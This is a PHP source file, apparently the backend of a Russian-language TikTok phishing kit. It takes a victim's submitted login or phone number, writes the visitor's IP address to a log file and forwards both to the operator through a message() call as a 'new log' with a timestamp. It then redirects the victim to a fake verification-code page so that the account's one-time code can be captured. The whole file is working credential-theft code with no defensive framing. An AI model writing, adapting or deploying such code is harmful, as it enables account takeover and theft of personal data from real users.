<?php 

require 'data.php';
ini_set('session.gc_maxlifetime', 3600);
ini_set('session.cookie_lifetime', 3600);
session_start();

$Login = $_POST['login'];


$data = date("d.m.Y");
$time = date("H:i");   
$ip0 = $_SERVER['REMOTE_ADDR'];
$iplogs = fopen('iplogs.php','a+');
fwrite($iplogs, $ip0); 
fclose($log);
 
$res = " 
🇺🇸 Версия страницы: EN

🛠 Дата и время: $data $time 

❄️ IP-адрес: $ip0"; 

function ipcheck($Login,$res) {
	if($_SESSION['number'] > 6) {
		session_commit();
		echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/en/error'></head></html>";
		die();
	}
	else {
		$_SESSION['number'] += 1;
		message('Статус: 📨 [TikTok - Новый лог]

👥 Номер: '.$Login. '

Ожидайте пароль или уведомление о запросе кода пользователем
'.$res);
	}
	return $_SESSION;
}



if (mb_substr_count(file_get_contents('iplogs.php'), $ip0) < 7) {
	ipcheck($Login,$res);
}
else {
	echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=/en/error'></head></html>";
}

session_commit();
header('Location: /en/phone-or-email/mobile-code');
exit();

?>		